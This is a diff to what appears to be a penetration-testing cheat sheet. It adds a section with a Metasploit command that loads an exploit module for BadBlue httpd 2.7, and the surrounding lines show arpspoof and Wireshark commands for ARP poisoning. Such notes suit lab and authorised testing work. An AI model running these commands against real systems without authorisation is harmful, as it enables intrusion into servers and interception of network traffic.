@@ -62,6 +62,7 @@ Ctrl + B 0 (1,2...) — Move to a specific window by number.
 
 # 2 Exploitation
 - [ARP Poisoning](#ARP-Poisoning)
+- [BadBlue httpd 2.7](#BadBlue-httpd-27)
 - [Rejetto HttpFileServer 2.3](#Rejetto-HttpFileServer-23)
 - 
 
@@ -75,6 +76,11 @@ arpspoof -i <interface> -t <ip1> -r <ip2>
 ```
 ```
 sudo wireshark -i <interface> -k
+```
+
+## BadBlue httpd 2.7
+```
+use exploit/windows/http/badblue_passthru
 ```
 
 ## Rejetto HttpFileServer 2.3
